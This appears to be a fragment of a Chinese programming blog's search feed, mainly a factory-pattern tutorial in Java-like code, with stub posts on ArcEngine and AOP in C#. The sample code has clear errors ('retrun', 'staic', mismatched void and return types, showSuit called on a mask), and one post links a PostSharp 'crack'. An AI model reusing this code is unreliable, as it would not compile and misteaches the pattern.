class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h4><h5 id="1-我们可以构建一个“口罩工厂”专门负责创建口罩对象，把口罩的初始化代码迁移到工厂类的创建方法中："><a href="#1-我们可以构建一个“口罩工厂”专门负责创建口罩对象，把口罩的初始化代码迁移到工厂类的创建方法中：" class="headerlink" title="1. 我们可以构建一个“口罩工厂”专门负责创建口罩对象，把口罩的初始化代码迁移到工厂类的创建方法中："></a>1. 我们可以构建一个“口罩工厂”专门负责创建口罩对象，把口罩的初始化代码迁移到工厂类的创建方法中：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mask</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Mask</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 口罩工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaskFactoy</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> Mask <span class="title">createMask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Mask mask = <span class="keyword">new</span> Mask();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码</span></span><br><span class="line">    retrun mask;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-1-假设口罩类存在子类，可以将口罩类作为抽象接口，子类-高级口罩和低级口罩-实现接口。"><a href="#2-1-假设口罩类存在子类，可以将口罩类作为抽象接口，子类-高级口罩和低级口罩-实现接口。" class="headerlink" title="2.1 假设口罩类存在子类，可以将口罩类作为抽象接口，子类(高级口罩和低级口罩)实现接口。"></a>2.1 假设口罩类存在子类，可以将口罩类作为抽象接口，子类(高级口罩和低级口罩)实现接口。</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IMask</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighEndMask</span> <span class="keyword">implements</span> <span class="title">IMask</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;我是高端口罩&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LowEndMask</span> <span class="keyword">implements</span> <span class="title">IMask</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;我是低端口罩&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-2-创建工厂"><a href="#2-2-创建工厂" class="headerlink" title="2.2 创建工厂"></a>2.2 创建工厂</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaskFactory</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> IMask <span class="title">createMask</span><span class="params">(type)</span></span>&#123;</span><br><span class="line">    IMask mask = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;高端口罩&quot;</span>.equals(type))&#123;</span><br><span class="line">      mask = <span class="keyword">new</span> HighEndMask();</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="comment">// HighEndMask 的100行初始化代码</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;低端口罩&quot;</span>.equals(type))&#123;</span><br><span class="line">      mask = <span class="keyword">new</span> LowEndMask();</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="comment">// LowEndMask 的100行初始化代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mask;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-3-只要传入对应的类型名称，就可以创建相应的口罩对象："><a href="#2-3-只要传入对应的类型名称，就可以创建相应的口罩对象：" class="headerlink" title="2.3 只要传入对应的类型名称，就可以创建相应的口罩对象："></a>2.3 只要传入对应的类型名称，就可以创建相应的口罩对象：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> staic <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[])</span></span>&#123;</span><br><span class="line">    MaskFactory factory = <span class="keyword">new</span> MaskFactory();</span><br><span class="line">    IMask maskA = factory.createMask(<span class="string">&quot;高端口罩&quot;</span>);</span><br><span class="line">    IMask maskB = factory.createMask(<span class="string">&quot;低端口罩&quot;</span>);</span><br><span class="line">    maskA.show();</span><br><span class="line">    maskB.show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h4><p>如果增加新的口罩子类，口罩工厂的创建方法中就要新增if-else判断，不符合面向对象的<strong>开发-封闭</strong>原则。所以我们可以为每个口罩子类创建对应的工厂子类，这些工厂子类分别实现抽象的工厂接口。(多态)</p><blockquote><p><strong>开放-封闭原则</strong>，即在程序中对<strong>扩展</strong>开放，对<strong>修改</strong>封闭。如果每次业务改动都要新增if-else，就涉及对旧有代码的修改，容易出错，可读性也不好。</p></blockquote><h5 id="1-2-所以我们可以修改简单工厂模式中2-2的内容，重构一下工厂类的逻辑："><a href="#1-2-所以我们可以修改简单工厂模式中2-2的内容，重构一下工厂类的逻辑：" class="headerlink" title="1.2 所以我们可以修改简单工厂模式中2.2的内容，重构一下工厂类的逻辑："></a>1.2 所以我们可以修改简单工厂模式中2.2的内容，重构一下工厂类的逻辑：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IMaskFactory</span></span>&#123;</span><br><span class="line">  <span class="function">IMask <span class="title">createMask</span><span class="params">()</span></span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighEndMaskFactory</span> <span class="keyword">implements</span> <span class="title">IMaskFactory</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> IMask <span class="title">createMask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IMask mask = <span class="keyword">new</span> HighEndMask(); </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码</span></span><br><span class="line">    <span class="keyword">return</span> mask;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LowEndMaskFactory</span> <span class="keyword">implements</span> <span class="title">IMaskFactory</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> IMask <span class="title">createMask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IMask mask = <span class="keyword">new</span> LowEndMask();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码</span></span><br><span class="line">    <span class="keyword">return</span> mask;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-2-使用"><a href="#1-2-使用" class="headerlink" title="1.2 使用"></a>1.2 使用</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[])</span></span>&#123;</span><br><span class="line">    IMaskFactory factoryA = <span class="keyword">new</span> HighEndMaskFactory();</span><br><span class="line">    IMask maskA = factoryA.createMask();</span><br><span class="line">    maskA.show();</span><br><span class="line">    IMaskFactory factoryB = <span class="keyword">new</span> LowEndMaskFactory();</span><br><span class="line">    IMask maskB = factoryB.createMask();</span><br><span class="line">    maskB.show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h4><p>如果需要创建子类越来越多，不只有口罩，还有防毒面具、防护服之类的，难道每一个子类都需要对应一个工厂吗？<br>解决：如果带创建的产品非常多，不需要为每个产品配上一个工厂类（比如高端口罩，低端口罩，高端防护服，低端防护服），而是可以把这些产品进行分组（把产品分为高端组和低端组，不同产品有工厂类的不同方法来创建）。</p><h5 id="1-1-创建产品类，口罩和防护服"><a href="#1-1-创建产品类，口罩和防护服" class="headerlink" title="1.1 创建产品类，口罩和防护服"></a>1.1 创建产品类，口罩和防护服</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 口罩接口和两个实现子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IMask</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">showMask</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighEndMask</span> <span class="keyword">implements</span> <span class="title">IMask</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showMask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;我的高端口罩&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LowEndMask</span> <span class="keyword">implements</span> <span class="title">IMask</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showMask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;我的低端口罩&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 防护服接口和两个实现子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IProjectiveSuit</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">showSuit</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighEndProjectSuit</span> <span class="keyword">implements</span> <span class="title">IProjectiveSuit</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showSuit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;我的高端防护服&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LowEndProjectSuit</span> <span class="keyword">implements</span> <span class="title">IProjectiveSuit</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showSuit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;我的低端防护服&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-2-工厂类"><a href="#1-2-工厂类" class="headerlink" title="1.2 工厂类"></a>1.2 工厂类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 区别在此，工厂方法模式创建 IMaskFactory 接口，分别实现高端口罩与低端口罩两个工厂子类</span></span><br><span class="line"><span class="comment">// 而抽象工厂模式，也是抽象出高端和低端两个工厂子类，在里面实现创建口罩和防护服类的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IFactory</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">createMask</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">createSuit</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighEndFactory</span> <span class="keyword">implements</span> <span class="title">IFactory</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> IMask <span class="title">createMask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IMask mask = <span class="keyword">new</span> HighEndMask();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码</span></span><br><span class="line">    <span class="keyword">return</span> mask;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> IProjectiveSuit <span class="title">createSuit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IProjectiveSuit suit = <span class="keyword">new</span> HighEndProjectSuit();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码</span></span><br><span class="line">    <span class="keyword">return</span> suit;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LowEndFactory</span> <span class="keyword">implements</span> <span class="title">IFactory</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> IMask <span class="title">createMask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IMask mask = <span class="keyword">new</span> LowEndMask();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码</span></span><br><span class="line">    <span class="keyword">return</span> mask;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> IProjectiveSuit <span class="title">createSuit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IProjectiveSuit suit = <span class="keyword">new</span> LowEndProjectSuit();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码</span></span><br><span class="line">    <span class="keyword">return</span> suit;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-3-使用"><a href="#1-3-使用" class="headerlink" title="1.3 使用"></a>1.3 使用</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(String[])</span></span>&#123;</span><br><span class="line">    <span class="comment">// 创建工厂</span></span><br><span class="line">    IFactory factoryA = <span class="keyword">new</span> HighEndFactory();</span><br><span class="line">    IFactory factoryB = <span class="keyword">new</span> LowEndFactory();</span><br><span class="line">    <span class="comment">// 创建高端口罩，高端防护服</span></span><br><span class="line">    IMask maskA = factoryA.createMask();</span><br><span class="line">    IProjectiveSuit suitA = factoryA.createSuit();</span><br><span class="line">    <span class="comment">// 创建低端口罩，低端防护服</span></span><br><span class="line">    IMask maskB = factoryB.createMask();</span><br><span class="line">    IProjectiveSuit suitB = factoryB.createSuit();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用</span></span><br><span class="line">    maskA.showMask();</span><br><span class="line">    maskB.showMask();</span><br><span class="line">    suitA.showSuit();</span><br><span class="line">    maskB.showSuit();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://design-patterns.readthedocs.io/zh_CN/latest/read_uml.html">设计模式教程</a><br>[微信公众号：程序员小灰]</p>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 工厂模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02：工厂模式最佳实践</title>
      <link href="/categories/C/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/02%EF%BC%9A%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/"/>
      <url>/categories/C/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/02%EF%BC%9A%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h3 id="简单工厂的最佳实践"><a href="#简单工厂的最佳实践" class="headerlink" title="简单工厂的最佳实践"></a>简单工厂的最佳实践</h3><p><b>场景</b>：对不同文件后缀（json、xml、yaml）使用不同的解析器（JsonRulerConfig、XmlRulerConfigParser…），将存储在文件中的配置解析成内存对象。<br>一般来说，我们通过if-else进行后缀判断，根据判断的结果选择对应的解析器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 工厂模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcEngine 查询篇</title>
      <link href="/categories/GIS/ArcEngine%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/arcengine-%E6%9F%A5%E8%AF%A2%E7%AF%87/"/>
      <url>/categories/GIS/ArcEngine%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/arcengine-%E6%9F%A5%E8%AF%A2%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="统计值"><a href="#统计值" class="headerlink" title="统计值"></a>统计值</h2><table><thead><tr><th>方式</th><th>表头</th><th>表头</th><th>表头</th></tr></thead><tbody><tr><td></td><td>单元格</td><td>单元格</td><td>单元格</td></tr><tr><td>IQueryDef接口</td><td>单元格</td><td>单元格</td><td>单元格</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><p><a href="https://fellowtravellers.github.io/2018/11/12/ArcEngine%E5%BC%80%E5%8F%91%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87%E6%8A%80%E5%B7%A7/#%E4%B8%89-%E7%BC%96%E8%BE%91%E7%AF%87">参考</a><br><a href="https://blog.csdn.net/HerryDong/article/details/105607174?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">ArcEngine获取字段唯一值的三种方法</a></p>]]></content>
      
      
      <categories>
          
          <category> GIS </category>
          
          <category> ArcEngine二次开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ArcEngine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AOP：静态织入实践</title>
      <link href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/C/aop%EF%BC%9A%E9%9D%99%E6%80%81%E7%BB%87%E5%85%A5%E5%AE%9E%E8%B7%B5/"/>
      <url>/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/C/aop%EF%BC%9A%E9%9D%99%E6%80%81%E7%BB%87%E5%85%A5%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="PostSharp框架"><a href="#PostSharp框架" class="headerlink" title="PostSharp框架"></a>PostSharp框架</h2><p>PostSharp是一个用于在.NET平台上实现AOP的框架，是比较常用的一个AOP框架，官方网站为<a href="http://www.sharpcrafters.com.目前最新版本为4.x,但是是收费的aop软件./">http://www.sharpcrafters.com。目前最新版本为4.X，但是是收费的AOP软件。</a></p><span id="more"></span><ol><li>下载安装 <a href="https://www.postsharp.net/downloads/postsharp-1.5/rtm/PostSharp-1.5.6.629-Release-x64-Installer.zip">免费版本1.5</a>  (<a href="https://www.cnblogs.com/vongzh/p/12519116.html">crack??</a>)</li><li></li></ol><p><a href="https://www.cnblogs.com/vongzh/p/12519116.html/">ff</a><br><a href="www.cnblogs.com/WinHEC/p/Postsharp_Basic_Usage.html">de</a><br><a href="https://developer.aliyun.com/article/325993">dd</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> AOP </tag>
            
            <tag> PostSync </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C#实现AOP的几种方式</title>
      <link href="/categories/C/AOP/c-%E5%AE%9E%E7%8E%B0aop%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/categories/C/AOP/c-%E5%AE%9E%E7%8E%B0aop%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是AOP"><a href="#什么是AOP" class="headerlink" title="什么是AOP"></a>什么是AOP</h2><p>AOP为Aspect Oriented Programming的缩写，意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的中统一处理业务逻辑的一种技术，比较常见的场景是：日志记录，错误捕获、性能监控等。AOP的本质是通过代理对象来间接执行真实对象，在代理类中往往会添加装饰一些额外的业务代码。</p><span id="more"></span><h2 id="AOP的实现方式"><a href="#AOP的实现方式" class="headerlink" title="AOP的实现方式"></a>AOP的实现方式</h2><ul><li>静态织入（编译时AOP）</li><li>动态织入（运行时AOP）<ul><li>通过设计模式：代理模式</li><li>使用system.remoting ：基于透明代理/真实代理实现（TransparentProxy/RealProxy)</li><li>使用emit动态生成代码</li></ul></li></ul><h3 id="静态织入"><a href="#静态织入" class="headerlink" title="静态织入"></a>静态织入</h3><p>通过扩展编译器对代码的中间语言（IL）插入代码的方式实现对目标对象的调用拦截。即在编译时，就将各种涉及AOP拦截的代码注入到符合一定规则的类中，编译后的代码与我们直接在RealA调用属性或方法前后增加代码是相同的，只是这个工作交由编译器来完成。<br>优点：快<br>缺点：<br>框架：postSharp</p><h3 id="设计模式：代理模式"><a href="#设计模式：代理模式" class="headerlink" title="设计模式：代理模式"></a>设计模式：代理模式</h3><p>优点：简单，纯靠设计模式实现<br>缺点：无法批量</p><h4 id="通过接口实现"><a href="#通过接口实现" class="headerlink" title="通过接口实现"></a>通过接口实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">//接口</span><br><span class="line">public interface IUserController</span><br><span class="line">&#123;</span><br><span class="line">    void login();</span><br><span class="line">    void register();</span><br><span class="line">&#125;</span><br><span class="line">//实现IUserController接口</span><br><span class="line">public class UserController&#123;</span><br><span class="line">    public UserController()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void register()</span><br><span class="line">    &#123;</span><br><span class="line">        //do something</span><br><span class="line">    &#125;</span><br><span 